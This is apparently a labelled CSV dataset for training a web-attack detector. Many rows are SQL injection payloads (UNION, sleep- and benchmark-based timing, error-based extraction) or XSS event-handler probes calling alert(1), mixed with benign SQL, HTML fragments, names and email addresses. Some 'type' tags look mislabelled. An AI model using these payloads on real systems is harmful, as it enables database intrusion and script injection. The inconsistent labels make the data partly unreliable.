Text,Label,type
" SELECT POSITION ( ""a"" IN CustomerName )  FROM Customers;",0,xss
8520,0,sql
23550240b,0,sql
"<li>Looking for specific information? Try the <a class=""hoverxref reference internal"" data-doc=""genindex"" data-project=""scrapy"" data-section="""" data-version=""latest"" href=""genindex.html""><span class=""std std-ref"">Index",0,xss
	 </span>,0,xss
SELECT * FROM colony  WHERE cook = everybody,0,xss
guell lloret,0,sql
evacuacin,0,sql
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",2,xss
 </div>,0,xss
"	 </span> <span class=""reference-text"">",0,xss
"<td onmouseover=""alert(1)"">test</td>",2,xss
<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>,2,xss
maximinio,0,sql
SELECT lunch ( s )  FROM date LEFT JOIN,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/logging.html"">Logging</a></li>",0,xss
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz",1,sql
"<a href=""/wiki/Artificial_brain"" title=""Artificial brain"">Artificial brain </a> arguments: AI requires a simulation of the operation of the human brain",0,xss
<link rel=stylesheet href=1 onerror=alert(1)>,2,xss
"<plaintext onbeforecopy=""alert(1)"" contenteditable>test</plaintext>",2,xss
16574331w,0,sql
hotson,0,sql
6.96678E+15,0,sql
"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",1,sql
somisett,0,sql
SELECT * FROM lower WHERE    NOT thou = 'teach',0,sql
SELECT * FROM task FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM house,0,sql
delujan,0,sql
"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",2,xss
"1"" where 3764  =  3764",1,xss
"-1076 union all select 3959,3959--",1,sql
"calle dean miranda 106, 6-f",0,sql
<svg><table onload=alert(1)></table>,2,xss
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",2,xss
SELECT * FROM storm WHERE teach BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT * FROM cotton,0,sql
DELETE FROM coat WHERE won = 'driving',0,sql
SELECT * FROM dark WHERE success = 'magnet'  AND City = 'tears',0,xss
to_timestamp_tz,1,sql
SELECT COUNT ( motion )  FROM topic,0,sql
"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
1'+  (  select 'zugq' where 9218  =  9218,1,sql
"-3278'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'zxig' like 'zxig",1,sql
"<listing onmouseover=""alert(1)"">test</listing>",2,xss
5.93447E+15,0,sql
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",2,xss
"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",1,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   3508  =  3508",1,sql
dalmacio,0,sql
SELECT * FROM color WHERE also = 'parallel',0,xss
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1,sql
cunillera penades,0,sql
SELECT * FROM tin FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT sentence,0,xss
SELECT forgotten ( s )  FROM better FULL OUTER JOIN,0,sql
7ar82fa,0,sql
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,sql
SELECT * FROM believed WHERE impossible = 'pictured'  AND City = 'fair',0,sql
swinton@voragolive.kz,0,sql
<colgroup onpointermove=alert(1)>XSS</colgroup>,2,xss
"  SELECT back AS himself, sand AS [clay]  FROM shelter",0,xss
SELECT sun ( s )  FROM direction FULL OUTER JOIN,0,sql
ilsup,0,xss
SELECT jump,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;27, 32–58, 968–972 </li>",0,xss
torgo,0,xss
"-9535"" order by 1--",1,sql
<tt id=x tabindex=1 onfocus=alert(1)></tt>,2,xss
graciliano,0,sql
kelcy,0,sql
3.09031E+15,0,xss
1'+  (  select ksoh where 6339  =  6339,1,xss
SELECT alive ( s ) FROM gulf INNER JOIN,0,sql
"  SELECT rateID AS ID, avoid AS recall FROM rice",0,sql
"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"  SELECT * FROM daily WHERE verb IN  ( 'club', 'beyond', 'mud' )  ",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>,2,xss
7.28211E+15,0,sql
"1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,xss
SELECT stay ( s ) FROM product INNER JOIN,0,sql
"1'   )    )    as uvxv where 6663  =  6663 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
bond@tomorrow.com.hk,0,sql
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",1,sql
"-5779  )   union all select 6089,6089--",1,sql
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,sql
"INSERT INTO motor ( air, angry, thread, excellent, elephant, type )  VALUES  ( 'screen', 'rate'. ago', 'won', 'chemical', 'putting', 'buried' )  ",0,sql
"<button oncontextmenu=""alert(1)"">test</button>",2,xss
SELECT AVG ( Price ) FROM left,0,sql
"1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277",1,xss
<output id=x tabindex=1 onfocusin=alert(1)></output>,2,xss
sacudir,0,sql
"1'  )   where 8628  =  8628 union all select null,null,null--",1,sql
SELECT stiff ( s )  FROM tried LEFT JOIN,0,sql
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1,sql
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,2,xss
	 </span> 2011 ,0,xss
"1"" union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",1,sql
canute,0,sql
"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",1,sql
1' in boolean mode  )   waitfor delay '0:0:5'--,1,sql
6.61271E+15,0,sql
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1,sql
<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,2,xss
42685012w,0,sql
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",2,xss
SELECT TOP 3 * FROM thrown SELECT * FROM became 3SELECT * FROM little,0,sql
"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",1,xss
<custom tags onpointerover=alert(1)>XSS</custom tags>,2,xss
verschuer_greenleaf@cajucar.cx,0,xss
SELECT * FROM angle WHERE NOT how = 'off'  AND NOT uncle = 'call',0,sql
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",2,xss
jou de lagarza,0,sql
union select * from users where login   =   char ...,1,sql
<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>,2,xss
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",1,sql
cap!tar,0,sql
1 where 7890  =  7890 or sleep  (  5  )  --,1,sql
1'  )   or sleep  (  5  ) ,1,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Evolutionary_computation"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
SELECT COUNT ( youthID ) FROM greatest,0,sql
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationstart=""alert(1)""></article>",2,xss
" select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",1,sql
"<slot onmousedown=""alert(1)"">test</slot>",2,xss
"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",1,sql
"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",1,sql
"<i onmouseout=""alert(1)"">test</i>",2,xss
"  SELECT waveID AS ID, locate AS section FROM place",0,sql
SELECT * FROM arm WHERE cold = 'balance',0,sql
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
"<param ondblclick=""alert(1)"">test</param>",2,xss
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'txwf'  =  'txwf",1,sql
"<address onkeypress=""alert(1)"" contenteditable>test</address>",2,xss
vladimirov@saludyfitness.br,0,sql
SELECT LOG10 ( 4.5 ) ;,0,sql
19310,0,sql
9ot87ico,0,sql
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
SELECT slightly ( s )  FROM steel LEFT JOIN,0,sql
27002424x,0,sql
"<col onkeyup=""alert(1)"" contenteditable>test</col>",2,xss
1 and 2006  =  2006,1,sql
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",2,xss
 </li>,0,xss
SELECT AVG ( specific ) FROM elephant,0,xss
"-4543""  )   or 3038  =  3038",1,sql
"<summary onmouseup=""alert(1)"">test</summary>",2,xss
"<li class=""toclevel-3 tocsection-22""><a href=""#Embodied_intelligence""><span class=""tocnumber"">5.3.1 ",0,xss
 or 'whatever' in   (  'whatever'  ) ,1,sql
SELECT * FROM  ( SELECT slide FROM shout ) ,0,sql
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, ~I.2.3, </li>",0,xss
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0,sql
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",2,xss
rub,0,sql
SELECT * FROM Customers WHERE Country = 'Germany' FETCH FIRST 3 ROWS ONLY;,0,sql
<label onpointerdown=alert(1)>XSS</label>,2,xss
nadav6,0,sql
navratil@sindns.as,0,sql
<data onpointerover=alert(1)>XSS</data>,2,xss
"  SELECT knifeID AS ID, farm AS save FROM universe",0,xss
52031263l,0,sql
SELECT * FROM black ORDER BY seven,0,sql
admin'or 1  =  1 or ''  =  ',1,sql
eldredge,0,xss
SELECT AVG ( setting ) FROM review SELECT SUM ( agree ) ,0,xss
"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """,1,xss
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,1,xss
ballista@kpincentives.sa,0,sql
SELECT * FROM interior WHERE themselves = 'compare'  OR verb = 'rain',0,sql
FROM  ( SELECT DISTINCT scared FROM respect ) ,0,sql
SELECT thick ( s ) FROM pleasant INNER JOIN,0,xss
1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,1,sql
"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",1,sql
"INSERT INTO earlier ( military, highest, anyone, house, almost, quite )  VALUES  ( 'jet', 'division'. one', 'film', 'shot', 'ago', 'clearly' )  ",0,sql
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
	 </ul>,0,xss
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationstart=""alert(1)""></th>",2,xss
SELECT hair ( s )  FROM attempt LEFT JOIN,0,sql
tinti@21horas.hr,0,xss
haewon7,0,xss
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,2,xss
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",2,xss
SELECT * FROM completely WHERE we NOT LIKE '[carry]%',0,sql
"travesia doctor sanchez, 139, 12?h",0,sql
SELECT COUNT ( DISTINCT principle )  FROM rate,0,sql
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sql
"1'||  (  select 'xsoq' from dual where 6690  =  6690 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,xss
SELECT * FROM onto WHERE in BETWEEN '1996-07-01' AND '1996-07-31',0,sql
agatn,0,xss
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",2,xss
SELECT * FROM done WHERE explore = 'shine' LIMIT 3,0,sql
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
mckuen@ciaplast.cn,0,sql
SELECT TOP 3 * FROM opportunity,0,xss
"c/ de la villa claudia 44, 4b",0,sql
SELECT ball ( s FROM being RIGHT JOIN,0,sql
"  SELECT * FROM good WHERE at NOT IN  ( 'share', 'kids', 'frozen' )  ",0,sql
"<noembed onkeydown=""alert(1)"" contenteditable>test</noembed>",2,xss
"            <a href=""//readthedocs.org/builds/scrapy/?fromdocs=scrapy"">Builds</a>",0,xss
" SELECT column_name ( s )  FROM wherever,everyone",0,sql
"  SELECT tired AS history, slide AS [too]  FROM plenty",0,sql
select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --,1,sql
"<div draggable=""true"" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>",2,xss
12489,0,sql
SELECT AVG ( you )  FROM reason  SELECT SUM ( raw ) ,0,sql
"  SELECT bowID AS ID, wheat AS flower FROM park",0,sql
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1,sql
"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",1,sql
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,2,xss
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ) ,0,sql
SELECT * FROM several WHERE individual  BETWEEN 10 AND 20,0,sql
41910864b,0,sql
SELECT musical FROM topic,0,sql
"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",1,sql
8537,0,sql
"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,1,sql
SELECT AVG ( yard )  FROM was  SELECT SUM ( factor ) ,0,sql
"          <dd><a href=""/en/master/"">master</a></dd>",0,xss
<svg><a onload=alert(1)></a>,2,xss
FROM  ( SELECT DISTINCT ran FROM outline ) ,0,sql
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",1,sql
i2cit6d4r,0,sql
SELECT COUNT ( humanID ) FROM fed,0,sql
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,2,xss
otxandio,0,xss
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Robotics"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""3"">",0,xss
1'||  (  select 'dsjg' where 2402  =  2402 and 1947  =  7472--,1,sql
SELECT club ( s )  FROM percent SELECT should FROM piano,0,sql
-8447 where 2850  =  2850 or 7147  =  3262,1,sql
3.68572E+15,0,sql
"<table oncontextmenu=""alert(1)"">test</table>",2,xss
	 </span> </li>,0,xss
sol,0,sql
	 </span>,0,xss
urbon,0,xss
"  SELECT * FROM stand WHERE still NOT IN  ( 'gain', 'happy', 'balance' )  ",0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;901–942, </li>",0,xss
"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1,xss
"<meta onmouseenter=""alert(1)"">test</meta>",2,xss
" SELECT column_name ( s )  FROM women,outside",0,sql
pittman,0,xss
"<meta onbeforecopy=""alert(1)"" contenteditable>test</meta>",2,xss
amalio,0,sql
"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",1,sql
	 </span></p>,0,xss
SELECT work ( s )  FROM when FULL OUTER JOIN,0,xss
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,2,xss
"<font draggable=""true"" ondragleave=""alert(1)"">test</font>",2,xss
"1'||  (  select 'kfyh' where 4737  =  4737 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1,sql
SELECT * FROM smooth WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,2,xss
" SELECT * FROM floor ORDER BY useful, general",0,sql
"<li><a href=""/wiki/Semantics_(computer_science)"" title=""Semantics (computer science)"">Semantics </a> </li> </ul>",0,xss
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationend=""alert(1)""></ul>",2,xss
"-6851'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'csfx'  =  'csfx",1,sql
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;314–329, </li>",0,xss
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,2,xss
damas severiche,0,xss
SELECT * FROM steep  WHERE start NOT LIKE '[met]%',0,sql
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0,sql
"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
"SELECT QUARTER ( ""2017-01-01 09:34:21"" ) ;",0,sql
 </li>,0,xss
chung,0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",1,xss
SELECT plural ( s )  FROM beyond FULL OUTER JOIN,0,sql
 </div>,0,xss
	 </span> 2014 ,0,xss
<em onpointermove=alert(1)>XSS</em>,2,xss
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",1,sql
<head>,0,xss
1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,sql
els,0,sql
"1%'   )    )    union all select null,null,null,null--",1,sql
	 </span>,0,xss
1'+  (  select 'ljtl' where 1766  =  1766,1,sql
SELECT AVG ( whom ) FROM having SELECT SUM ( sweet ) ,0,sql
	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0,xss
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,sql
" select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",1,sql
SELECT * FROM bell WHERE you = 'nodded'  OR use = 'gave',0,sql
SELECT * FROM job WHERE soap = 'what'  AND City = 'chose',0,xss
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1,sql
"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",1,xss
SELECT * FROM end WHERE empty NOT BETWEEN 'oxygen' AND 'everywhere',0,xss
"<li class=""toclevel-2 tocsection-40""><a href=""#Government""><span class=""tocnumber"">7.5 ",0,xss
" select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1,sql
	 </span>,0,xss
<object id=x onfocus=alert(1) type=text/html>,2,xss
02124892z,0,sql
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,2,xss
372,0,sql
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,1,sql
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",2,xss
1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,sql
niemyska@inversioneolica.lt,0,sql
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11710 )  ORDER BY meta_id ASC",0,sql
 or userid like '%,1,sql
SELECT parent ( s )  FROM gently LEFT JOIN,0,sql
 UPDATE heart SET service = 'track'WHERE needs = 'fight',0,xss
8.58629E+14,0,sql
"  SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee",0,sql
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0,xss
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1,sql
SELECT * FROM wonder WHERE rocket NOT BETWEEN 'example' AND 'spider',0,sql
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1%' and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"1%""   )    )    union all select null,null,null,null,null,null,null,null#",1,sql
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc",1,sql
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,1,xss
"   SELECT COUNT ( negative ) , mad FROM bend BY story",0,sql
"<li><a href=""/wiki/Soft_robotics"" title=""Soft robotics"">Soft robotics </a> </li> </ul>",0,xss
"  SELECT situation AS evidence, customs AS [policeman]  FROM fight",0,sql
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",2,xss
bauer,0,xss
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,0,sql
	 </span>,0,xss
"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT AVG ( let )  FROM continent  SELECT SUM ( magic ) ,0,xss
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1%""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
	 </span> </li>,0,xss
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1,sql
enseriarse,0,xss
"<link draggable=""true"" ondragend=""alert(1)"">test</link>",2,xss
"  SELECT alike,tell,pile FROM usually LEFT JOIN Orders ON yesterday.silkID =  feet.zero ORDER BY steady.hill",0,sql
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",2,xss
SELECT * FROM tin ORDER BY minute DESC,0,sql
SELECT * FROM hurried WHERE won LIKE '%child%',0,sql
"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",1,sql
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",2,xss
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) ,0,sql
duilio,0,sql
	 </span> </li>,0,xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",1,sql
"  SELECT City, Country FROM CustomersWHERE Country = 'Germany'UNION SELECT City, Country FROM Suppliers",0,sql
UNION SELECT,1,sql
alhama de murcia,0,xss
eggebraa,0,sql
denni,0,xss
SELECT * FROM floor WHERE its LIKE '%careful%',0,xss
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",2,xss
"1""  )   where 9861  =  9861",1,sql
1.3059E+15,0,sql
5.56194E+15,0,sql
